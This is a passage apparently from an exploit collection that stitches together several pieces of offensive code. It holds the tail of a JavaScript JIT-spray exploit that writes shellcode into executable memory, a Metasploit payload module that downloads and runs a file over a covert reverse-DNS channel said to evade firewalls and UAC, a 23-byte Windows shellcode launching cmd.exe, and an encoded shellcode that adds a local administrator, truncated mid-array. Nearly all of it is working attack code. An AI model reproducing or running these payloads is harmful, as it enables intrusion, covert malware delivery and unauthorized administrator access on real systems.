"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebddb4^"+ // mov ah, dd
"0x14ebd0b0^"+ // mov al, d0
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax
"0x14ebffb4^"+ // mov ah, b7
"0x14eb31b0^"+ // mov al, 0f
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebb2b4^"+ // mov ah, b2
"0x14eb71b0^"+ // mov al, 71
"0x14ebe0f7^"+ // EAX
"0x14eb3cb4^"+ // mov ah, 3c
"0x14ebacb0^"+ // mov al, ac
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebdeb4^"+ // mov ah, de
"0x14eb5ab0^"+ // mov al, 5a
"0x14ebe0f7^"+ // EAX
"0x14eb2cb4^"+ // mov ah, 2c
"0x14eb02b0^"+ // mov al, 02
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebe1b4^"+ // mov ah, e1
"0x14ebb6b0^"+ // mov al, b6
"0x14ebe0f7^"+ // EAX
"0x14eb0db4^"+ // mov ah, 0d
"0x14ebcfb0^"+ // mov al, cf
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb95b4^"+ // mov ah, 95
"0x14eb84b0^"+ // mov al, 84
"0x14ebe0f7^"+ // EAX
"0x14ebf0b4^"+ // mov ah, f0
"0x14ebe2b0^"+ // mov al, e2
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebbcb4^"+ // mov ah, bc
"0x14ebaeb0^"+ // mov al, ae
"0x14ebe0f7^"+ // EAX
"0x14eb52b4^"+ // mov ah, 52
"0x14eb8bb0^"+ // mov al, 8b
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebe6b4^"+ // mov ah, e6
"0x14ebc2b0^"+ // mov al, c2
"0x14ebe0f7^"+ // EAX
"0x14eb3cb4^"+ // mov ah, 3c
"0x14eb42b0^"+ // mov al, 42
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebb8b4^"+ // mov ah, b8
"0x14ebd9b0^"+ // mov al, d9
"0x14ebe0f7^"+ // EAX
"0x14eb40b4^"+ // mov ah, 40
"0x14eb8bb0^"+ // mov al, 8b
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb12b4^"+ // mov ah, 12
"0x14eb2bb0^"+ // mov al, 2b
"0x14ebe0f7^"+ // EAX
"0x14eb74b4^"+ // mov ah, 74
"0x14ebc0b0^"+ // mov al, c0
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb88b4^"+ // mov ah, 88
"0x14eb47b0^"+ // mov al, 47
"0x14ebe0f7^"+ // EAX
"0x14eb50b4^"+ // mov ah, 50
"0x14ebd0b0^"+ // mov al, d0
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb5ab4^"+ // mov ah, 5a
"0x14ebffb0^"+ // mov al, ff
"0x14ebe0f7^"+ // EAX
"0x14eb8bb4^"+ // mov ah, 8b
"0x14eb18b0^"+ // mov al, 18
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb7cb4^"+ // mov ah, 7c
"0x14ebdab0^"+ // mov al, da
"0x14ebe0f7^"+ // EAX
"0x14ebd3b4^"+ // mov ah, d3
"0x14eb01b0^"+ // mov al, 01
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebbcb4^"+ // mov ah, bc
"0x14ebc7b0^"+ // mov al, c7
"0x14ebe0f7^"+ // EAX
"0x14eb8bb4^"+ // mov ah, 8b
"0x14eb49b0^"+ // mov al, 49
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebffb4^"+ // mov ah, ff
"0x14eb98b0^"+ // mov al, 98
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax
"0x14ebd6b4^"+ // mov ah, d6
"0x14eb01b0^"+ // mov al, 01
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebdeb4^"+ // mov ah, de
"0x14ebaab0^"+ // mov al, aa
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax
"0x14ebc0b4^"+ // mov ah, c0
"0x14eb31b0^"+ // mov al, 31
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebe1b4^"+ // mov ah, e1
"0x14ebb6b0^"+ // mov al, b6
"0x14ebe0f7^"+ // EAX
"0x14eb0db4^"+ // mov ah, 0d
"0x14ebcfb0^"+ // mov al, cf
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebfab4^"+ // mov ah, fa
"0x14eb29b0^"+ // mov al, 29
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax
"0x14ebe0b4^"+ // mov ah, e0
"0x14eb38b0^"+ // mov al, 38
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb7bb4^"+ // mov ah, 7b
"0x14ebe8b0^"+ // mov al, e8
"0x14ebe0f7^"+ // EAX
"0x14eb7db4^"+ // mov ah, 7d
"0x14eb03b0^"+ // mov al, 03
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebf0b4^"+ // mov ah, f0
"0x14ebc7b0^"+ // mov al, c7
"0x14ebe0f7^"+ // EAX
"0x14eb24b4^"+ // mov ah, 24
"0x14eb7db0^"+ // mov al, 7d
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb60b4^"+ // mov ah, 60
"0x14eb76b0^"+ // mov al, 76
"0x14ebe0f7^"+ // EAX
"0x14eb8bb4^"+ // mov ah, 8b
"0x14eb58b0^"+ // mov al, 58
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebbcb4^"+ // mov ah, bc
"0x14ebe8b0^"+ // mov al, e8
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax
"0x14ebd3b4^"+ // mov ah, d3
"0x14eb01b0^"+ // mov al, 01
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb96b4^"+ // mov ah, 96
"0x14eb8fb0^"+ // mov al, 8f
"0x14ebe0f7^"+ // EAX
"0x14eb4bb4^"+ // mov ah, 4b
"0x14eb0cb0^"+ // mov al, 0c
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebbdb4^"+ // mov ah, bd
"0x14eb32b0^"+ // mov al, 32
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax
"0x14eb01b4^"+ // mov ah, 01
"0x14eb1cb0^"+ // mov al, 1c
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebe6b4^"+ // mov ah, e6
"0x14ebc2b0^"+ // mov al, c2
"0x14ebe0f7^"+ // EAX
"0x14eb8bb4^"+ // mov ah, 8b
"0x14eb04b0^"+ // mov al, 04
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb60b4^"+ // mov ah, 60
"0x14eb30b0^"+ // mov al, 30
"0x14ebe0f7^"+ // EAX
"0x14eb44b4^"+ // mov ah, 44
"0x14eb89b0^"+ // mov al, 89
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb97b4^"+ // mov ah, 97
"0x14eb44b0^"+ // mov al, 44
"0x14ebe0f7^"+ // EAX
"0x14eb5bb4^"+ // mov ah, 5b
"0x14eb5bb0^"+ // mov al, 5b
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebefb4^"+ // mov ah, ef
"0x14ebffb0^"+ // mov al, ff
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax
"0x14eb51b4^"+ // mov ah, 51
"0x14eb5ab0^"+ // mov al, 5a
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebbcb4^"+ // mov ah, bc
"0x14ebe0b0^"+ // mov al, e0
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax
"0x14eb5fb4^"+ // mov ah, 5f
"0x14eb58b0^"+ // mov al, 58
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb9ab4^"+ // mov ah, 9a
"0x14ebbcb0^"+ // mov al, bc
"0x14ebe0f7^"+ // EAX
"0x14ebebb4^"+ // mov ah, eb
"0x14eb12b0^"+ // mov al, 12
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebb8b4^"+ // mov ah, b8
"0x14ebe7b0^"+ // mov al, e7
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax
"0x14eb01b4^"+ // mov ah, 01
"0x14eb6ab0^"+ // mov al, 6a
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebb9b0^"+ // mov al, b9
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebbcb4^"+ // mov ah, bc
"0x14ebc5b0^"+ // mov al, c5
"0x14ebe0f7^"+ // EAX
"0x14eb68b4^"+ // mov ah, 68
"0x14eb50b0^"+ // mov al, 50
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebeab4^"+ // mov ah, ea
"0x14eb0fb0^"+ // mov al, 0f
"0x14ebe0f7^"+ // EAX
"0x14eb87b4^"+ // mov ah, 87
"0x14eb6fb0^"+ // mov al, 6f
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebccb4^"+ // mov ah, cc
"0x14eb17b0^"+ // mov al, 17
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax
"0x14ebf0b4^"+ // mov ah, f0
"0x14ebbbb0^"+ // mov al, bb
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebc3b4^"+ // mov ah, c3
"0x14ebbbb0^"+ // mov al, bb
"0x14ebe0f7^"+ // EAX
"0x14eb68b4^"+ // mov ah, 68
"0x14eb56b0^"+ // mov al, 56
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebeab4^"+ // mov ah, ea
"0x14eb0fb0^"+ // mov al, 0f
"0x14ebe0f7^"+ // EAX
"0x14eb9db4^"+ // mov ah, 9d
"0x14ebbdb0^"+ // mov al, bd
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb33b4^"+ // mov ah, 33
"0x14ebcfb0^"+ // mov al, cf
"0x14ebe0f7^"+ // EAX
"0x14eb06b4^"+ // mov ah, 06
"0x14eb3cb0^"+ // mov al, 3c
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebadb4^"+ // mov ah, ad
"0x14ebb7b0^"+ // mov al, b7
"0x14ebe0f7^"+ // EAX
"0x14ebfbb4^"+ // mov ah, fb
"0x14eb80b0^"+ // mov al, 80
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb46b4^"+ // mov ah, 46
"0x14eb40b0^"+ // mov al, 40
"0x14ebe0f7^"+ // EAX
"0x14ebbbb4^"+ // mov ah, bb
"0x14eb05b0^"+ // mov al, 05
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb0ab4^"+ // mov ah, 0a
"0x14eb4cb0^"+ // mov al, 4c
"0x14ebe0f7^"+ // EAX
"0x14eb6fb4^"+ // mov ah, 6f
"0x14eb72b0^"+ // mov al, 72
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb9fb4^"+ // mov ah, 9f
"0x14ebdeb0^"+ // mov al, de
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14eb53b0^"+ // mov al, 53
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb09b4^"+ // mov ah, 09
"0x14ebf4b0^"+ // mov al, f4
"0x14ebe0f7^"+ // EAX
"0x14eb6cb4^"+ // mov ah, 6c
"0x14eb61b0^"+ // mov al, 61
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
 
"0x14eb00b5^"+ // mov ch, 00
"0x14eb00b1^"+ // mov cl, 00 ; ECX = 06010000 ; RWE memory WITH shellcode
"0x14ebe1ff^"+ // JMP ECX ; PROFIT !
 
"0x14ebcccc"+
");"+
"return y; }";
 
 
var zl="zlo_";
     
for (var i=1;i<800;i++)
{
    SPRAY+="function "+zl+i+"()"+JIT+" "+zl+i+"();";
}
 
eval(SPRAY);
 
</script>



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

##
# Shellcode: download and execute file via reverse DNS channel
#
#
# Features:
# * Windows 7 tested
# * UAC without work (svchost.exe makes requests via getaddrinfo)
# * Firewall/Router/Nat/Proxy bypass reverse connection (like dnscat do, but without sockets and stable!)
# * NO SOCKET
#
# DNS handler - http://dsecrg.com/files/pub/tools/revdns.zip
#
#
# By Alexey Sintsov
#       [DSecRG]
#     a.sintsov [sobachka] dsecrg.com
#     dookie [sobachka] inbox.ru
#
# P.S. Works with  Vista/7/2008
#       do not work in XP/2003 because thre are no IPv6 by default.
#       can work in XP/2003 if IPv6 installed
#       (it is not need to be enabled, just installed)
 
require 'msf/core'
 
module Metasploit3
 
    include Msf::Payload::Windows
    include Msf::Payload::Single
 
    def initialize(info = {})
        super(update_info(info,
            'Name'          => 'DNS_DOWNLOAD_EXEC',
            'Version'       => '0.01',
            'Description'   => 'Download and Exec (via DNS)',
            'Author'        => [ 'Alexey Sintsov' ],
            'License'       => MSF_LICENSE,
            'Platform'      => 'win',
            'Arch'          => ARCH_X86,
            'Payload'       =>
                {
                    'Offsets' =>{ },
                     
                    'Begin' => "\xeb\x02\xeb\x7A\xe8\xf9\xff\xff\xff\x47\x65\x74\x50\x72\x6F\x63\x41\x64\x64\x72\x65\x73\x73\xFF\x47\x65\x74\x54\x65\x6d\x70\x50\x61\x74\x68\x41\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x57\x69\x6E\x45\x78\x65\x63\xFF\x45\x78\x69\x74\x54\x68\x72\x65\x61\x64\xff\x4C\x6F\x61\x64\x4C\x69\x62\x72\x61\x72\x79\x41\xFF\x77\x73\x32\x5f\x33\x32\xFF\x57\x53\x41\x53\x74\x61\x72\x74\x75\x70\xFF\x67\x65\x74\x61\x64\x64\x72\x69\x6e\x66\x6f\xFF\x6d\x73\x76\x63\x72\x74\xFF\x66\x6f\x70\x65\x6e\xFF\x66\x77\x72\x69\x74\x65\xFF\xEB\x13\x66\x63\x6c\x6f\x73\x65\xFF",
                     
                    'Payload1' => "\xFF\x5e\x33\xc9\xb1\xe4\x8b\xd1\x2b\xe2\x8b\xfc\xf3\xa4\x33\xc0\x8b\xfc\x8A\x04\x39\x3A\xCA\x74\x0D\x3C\xFF\x74\x03\x41\xEB\xF2\x88\x2C\x39\x41\xEB\xEC\xeb\x78\x31\xC9\x64\x8B\x71\x30\x8B\x76\x0C\x8B\x76\x1C\x8B\x5e\x08\x8B\x7E\x20\x33\xed\x83\xc5\x18\x8B\x36\x66\x39\x0C\x2F\x75\xed\x8B\x73\x3C\x8B\x74\x1E\x78\x03\xF3\x8B\x7E\x20\x03\xFB\x8B\x4E\x14\x33\xED\x56\x57\x51\x8B\x3F\x03\xFB\x8B\xF2\x6A\x0E\x59\xF3\xA6\x74\x08\x59\x5F\x83\xC7\x04\x45\xE2\xE9\x59\x5F\x5E\x8B\xCD\x8B\x46\x24\x03\xC3\xD1\xE1\x03\xC1\x33\xC9\x66\x8B\x08\x8B\x46\x1C\x03\xC3\xC1\xE1\x02\x03\xC8\x8B\x01\x03\xC3\x8B\xFA\x8B\xF7\x83\xC6\x0E\x8B\xD0\x6A\x04\x59\xC3\x8b\xd4\xe8\x81\xff\xff\xff\x50\x33\xc0\xb0\x0f\x03\xf8\x57\x53\xff\xd2\x50\x33\xc0\xb0\x14\x03\xf8\x57\x53\xff\x54\x24\x0c\x50\x33\xc0\xb0\x08\x03\xf8\x57\x53\xff\x54\x24\x10\x50\x33\xc0\xb0\x0b\x03\xf8\x57\x53\xff\x54\x24\x14\x50\x8b\xc7\x83\xc0\x0d\x50\xff\x54\x24\x04\x8b\xd8\x33\xc0\xb0\x14\x03\xf8\x57\x53\xff\x54\x24\x18\x50\x33\xc0\xb0\x0b\x03\xf8\x57\x53\xff\x54\x24\x1C\x50\x83\xc7\x0c\x57\xff\x54\x24\x0c\x8b\xd8\x83\xc7\x07\x57\x53\xff\x54\x24\x20\x50\x83\xc7\x06\x57\x53\xff\x54\x24\x24\x50\x50\x8b\xf4\x83\xc7\x09\x57\x53\xff\x54\x24\x2c\x50\x33\xc0\xb4\x03\x2b\xe0\x8b\xcc\x51\x50\xff\x56\x20\x03\xe0\x59\x59\x8b\xc8\xb8",
                     
                    'Payload2' => "\xba\x01\x01\x01\x01\x2b\xc2\x50\xb8\x79\x78\x6f\x2e\x50\x2b\xe1\x8b\xcc\x33\xc0\xb0\x77\xb4\x62\x50\x54\x51\xff\x56\x08\x33\xd2\xb6\x03\xb2\x0c\x03\xe2\x50\x33\xc0\xb4\x05\x2b\xe0\x54\x33\xc0\xb0\x02\xb4\x02\x50\xff\x56\x10\x32\xc9\x50\x80\xf9\x80\x74\x04\xfe\xc1\xeb\xf6\x83\xc4\x10\xb0\x06\x50\xb0\x01\x50\xb0\x17\x50\x83\xec\x04\x8B\xEC\x83\xC7\x07\x83\xEC\x20\x33\xC0\x8A\x0C\x38\x88\x0C\x04\x40\x84\xC9\x75\xF5\x33\xc0\xb9\x61\x61\x61\x61\x8b\xd9\x51\x8b\xd4\x83\xc2\x7f\x52\x33\xd2\x55\x52\x8b\xd4\x83\xc2\x0c\x52\xff\x56\x0c\x59\x51\x85\xc0\x75\xe7\x33\xDB\xB3\xee\x2B\xE3\x50\x8b\xc5\x8b\x40\x5b\x8b\x48\x18\x8b\x50\x1c\x83\xC1\x08\x33\xC0\x33\xFF\x66\x8B\x01\x66\x3d\xff\xff\x74\x7f\x8b\xf8\xc1\xef\x08\x32\xe4\x5b\x03\xfb\x57\x66\x8B\x59\x02\x66\x89\x5c\x04\x04\x8B\x79\x04\x89\x7C\x04\x06\x8B\x79\x08\x89\x7C\x04\x0A\x8B\x79\x0C\x89\x7C\x04\x0E\x8b\xc2\x85\xc0\x75\xbb\x58\xff\x76\xf8\x50\xb0\x01\x50\x8b\xc4\x83\xc0\x0c\x50\xff\x56\x04\x33\xc0\xb0\xee\x03\xe0\x58\x58\x58\x58\x58\x2D\x61\x61\x61\x61\xC0\xE4\x04\x02\xC4\x3C\xFF\x75\x13\x8A\xE0\x40\xc1\xe8\x10\x3c\x1a\x75\x04\xfe\xc4\x32\xc0\xc1\xe0\x10\xeb\x08\x40\x8a\xe0\xC0\xEC\x04\x24\x0F\x05\x61\x61\x61\x61\x50\xe9\x46\xff\xff\xff\x8b\x46\xf8\x50\xff\x56\xfc\x66\xb8\x22\x05\x03\xe0"+"\x68\x2f\x63\x20\x22\x68\x63\x6d\x64\x20\x8b\xcc\x41\x8a\x01\x84\xc0\x75\xf9\xc6\x01\x22\x88\x41\x01"+"\x33\xc0\x8b\xcc\x50\x51\xff\x56\x1c\x50\xff\x56\x18" 
                     
                }
            ))
 
        # We use rtlExitThread(0)
        deregister_options('EXITFUNC')
 
        # Register the domain and cmd options
        register_options(
            [
                OptString.new('DOMAIN', [ true, "The domain name to use (9 bytes - maximum)" ]),
                OptString.new('FILE', [ true, "Filename extension (default VBS)" ]),
            ], self.class)
    end
 
    #
    # Constructs the payload
    #
    def generate_stage
        domain  = datastore['DOMAIN'] || ''
        extens  = datastore['FILE'] || 'vbs'
         
        # \"x66\x79\x66\x01"
        extLen=extens.length
         
        while extens.length<4
            extens=extens+"\x01"
        end
         
        i=0
        while i<extLen
            extens[i,1]=(extens[i].ord+1).chr
            i=i+1
        end
         
        while domain.length<10
            domain=domain+"\xFF"
        end
         
        domain="\x2e"+domain
         
        payload=module_info['Payload']['Begin'] + domain + module_info['Payload']['Payload1'] + extens + module_info['Payload']['Payload2']
                 
        return payload
    end
 
end



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
win32/xp sp2 (En + Ar) cmd.exe 23 bytes
Author : AnTi SeCuRe
TeaM : SauDi ViRuS TeaM
Email : AnTi-SeCuRe@HoTMaiL.CoM
Site : WwW.VxX9.Cc
Thx To : Stack , SauDi ViRuS TeaM ( RENO - Dr.php - ! BaD BoY ! - Jetli007 - Gov.hacker )
Description : It's a 23 Byte Shellcode which Execute Cmd.exe Tested Under Windows Xp SP2 English and arabic .
get the following if we disassemle this code compiled with olly debugger
 
00402000  > 8BEC             MOV EBP,ESP
00402002  . 68 65786520      PUSH 20657865
00402007  . 68 636D642E      PUSH 2E646D63
0040200C  . 8D45 F8          LEA EAX,DWORD PTR SS:[EBP-8]
0040200F  . 50               PUSH EAX
00402010  . B8 8D15867C      MOV EAX,kernel32.WinExec
00402015  . FFD0             CALL EAX
*/
#include <stdio.h>
unsigned char shellcode[] =
                        "\x8b\xec\x68\x65\x78\x65"
                        "\x20\x68\x63\x6d\x64\x2e"
                        "\x8d\x45\xf8\x50\xb8\x8D"
                        "\x15\x86\x7C\xff\xd0";
int main ()
{
int *ret;
ret=(int *)&ret+2;
printf("Shellcode Length is : %d\n",strlen(shellcode));
(*ret)=(int)shellcode;
return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Title: generic win32 - add new local administrator 326 bytes
Author: Anastasios Monachos (secuid0) - anastasiosm[at]gmail[dot]com
Method: Dynamic opcode, encoded shellcode
Tested on: WinXP Pro SP3 (EN) 32bit - Build 2600.100427-1636 and Build 2600.080413-2111
Greetz: offsec team, inj3ct0r team, hdm
*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
 
char code[] =
"\xda\xde\xd9\x74\x24\xf4\xb8\x22\xd2\x27\x7a\x29\xc9\xb1\x4b"
"\x5b\x31\x43\x1a\x83\xeb\xfc\x03\x43\x16\xe2\xd7\x3b\xbc\x7a"
"\x17\xbc\x95\x4b\xd7\xd8\x92\xec\xe7\xa5\x65\x94\x08\x2d\x25"
"\x69\x9d\x41\xba\xdc\x2a\xe1\xca\xf7\x25\xe2\xca\x07\xbe\xa2"
"\xfe\x8a\x80\x5e\x74\xd4\x3c\xc1\x49\xb5\xb7\x91\x69\x12\x4c"
"\x2c\x4e\xd1\x06\xaa\xd6\xe4\x4c\x3f\x6c\xff\x1b\x1a\x51\xfe"
"\xf0\x78\xa5\x49\x8d\x4b\x4d\x48\x7f\x82\xae\x7a\xbf\x19\xfc"
"\xf9\xff\x96\xfa\xc0\x30\x5b\x04\x04\x25\x90\x3d\xf6\x9d\x71"
"\x37\xe7\x56\xdb\x93\xe6\x83\xba\x50\xe4\x18\xc8\x3d\xe9\x9f"
"\x25\x4a\x15\x14\xb8\xa5\x9f\x6e\x9f\x29\xc1\xad\x72\x01\x53"
"\xd9\x27\x5d\xac\xe6\xb1\xa5\xd2\xdc\xca\xa9\xd4\xdc\x4b\x6e"
